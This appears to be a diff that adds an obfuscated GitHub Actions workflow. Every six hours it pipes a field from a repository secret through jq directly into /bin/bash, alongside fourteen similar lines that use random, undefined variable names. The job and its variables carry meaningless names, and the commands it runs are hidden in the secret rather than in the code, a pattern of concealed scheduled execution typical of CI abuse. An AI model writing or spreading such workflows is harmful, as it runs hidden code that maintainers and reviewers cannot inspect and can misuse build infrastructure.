@@ -1,0 +1,33 @@
+name: chedideliebieshen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chedideliebieshen
+        env:
+          sfav40: ${{ secrets.sfav40 }}
+        run: |
+          echo $sfav40 | jq -r .idc9 | /bin/bash
+          echo $ywror42682 | jq -r .mrq7 | /bin/bash
+          echo $p92 | jq -r .gutm568 | /bin/bash
+          echo $lnk90014 | jq -r .bdnm6680 | /bin/bash
+          echo $tfk539 | jq -r .ds54 | /bin/bash
+          echo $dgmc5 | jq -r .rb27131 | /bin/bash
+          echo $zj11510 | jq -r .x2 | /bin/bash
+          echo $oamfl717 | jq -r .imjuj639 | /bin/bash
+          echo $ay9734 | jq -r .tl5594 | /bin/bash
+          echo $py01 | jq -r .myk5078 | /bin/bash
+          echo $htwgm1 | jq -r .civ44 | /bin/bash
+          echo $tp980 | jq -r .ddoal6 | /bin/bash
+          echo $hzvfj98289 | jq -r .jq77946 | /bin/bash
+          echo $w45160 | jq -r .wu94537 | /bin/bash
+          echo $qkmk0391 | jq -r .iotzp560 | /bin/bash
+
